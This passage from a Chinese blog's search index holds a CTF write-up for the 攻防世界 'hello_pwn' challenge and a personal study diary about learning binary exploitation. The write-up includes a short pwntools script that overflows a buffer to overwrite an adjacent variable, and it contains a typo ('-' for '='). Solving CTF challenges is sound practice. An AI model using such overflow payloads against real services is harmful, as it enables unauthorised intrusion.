punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参数调用格式</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn-hello_pwn</title>
      <link href="/ctf-pwn/7d1de980.html"/>
      <url>/ctf-pwn/7d1de980.html</url>
      
        <content type="html"><![CDATA[<p>参数覆盖 <strong>小端存储</strong><br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230706222328.png" style="zoom: 50%;" /><br>两个函数参数相差4<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230706222443.png" style="zoom:50%;" /></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token punctuation">)</span>payload <span class="token operator">-</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">4</span> <span class="token operator">+</span> <span class="token string">b'aaun'</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>天天向上</title>
      <link href="/undefined/7ed5fe30.html"/>
      <url>/undefined/7ed5fe30.html</url>
      
        <content type="html"><![CDATA[<h1 id="2023"><a href="#2023" class="headerlink" title="2023"></a>2023</h1><h2 id="09-04"><a href="#09-04" class="headerlink" title="09.04"></a>09.04</h2><p><a href="https://blog.yangsx.cn/ctf-pwn/c42410d2.html">攻防世界pwn-反应釜 | 小哑师兄 (yangsx.cn)</a></p><h2 id="09-02"><a href="#09-02" class="headerlink" title="09.02"></a>09.02</h2><p><a href="https://blog.yangsx.cn/ctf-pwn/1bdd2aa8.html">攻防世界pwn-pwn1 | 小哑师兄 (yangsx.cn)</a></p><h2 id="08-31"><a href="#08-31" class="headerlink" title="08.31"></a>08.31</h2><p>八月的最后一天看了点got利用的pwn, got和plt也理解了, 但是在pwn中的利用还是不太会, 怎么去泄漏地址还没掌握.</p><p>整个八月的成长不是很大, 希望自己接下来真的能静下心来去学习去提升自己.</p><h2 id="08-25-08-27"><a href="#08-25-08-27" class="headerlink" title="08.25-08.27"></a>08.25-08.27</h2><p>周六日好好休息了下, 顺带补网络的基础知识. 28, 29因为外出工作摸不到电脑, 搁置了.</p><h2 id="08-24"><a href="#08-24" class="headerlink" title="08.24"></a>08.24</h2><p>今天就是G, 本来今天调休, 结果另有工作安排, 然后对接工作的人快要下班的时候才来交东西加班到比较晚才下班. 在此期间只能像个木头一样干熬. 😅</p><h2 id="08-23"><a href="#08-23" class="headerlink" title="08.23"></a>08.23</h2><p>又去看plt和got表, Linux的知识储备太少了. 攻防世界做pwn题, 没弄完. HW最后一天杂事比较多, 第一次HW, 也是以甲方身份参加, 很多活都是乙方的, 自己感受不是那么深</p><h2 id="08-22"><a href="#08-22" class="headerlink" title="08.22"></a>08.22</h2><p>正好不是我的班, 开开心心去找对象玩了</p><h2 id="08-21"><a href="#08-21" class="headerlink" title="08.21"></a>08.21</h2><p>今天下午鼓捣了博客 尝试腾讯serverless部署博客, 访问很快, 但是需要cdn绑定到自己的域名. 复现qq的rce, 就大佬不知道咋挖出来的. 尝试给博客搞google收录, 但是google一直读不到sitemap, 其他检测网站可以正常读取. </p><h2 id="07-20-08-20"><a href="#07-20-08-20" class="headerlink" title="07.20-08.20"></a>07.20-08.20</h2><p>陆陆续续在刷攻防世界的pwn,但整体效率不高</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
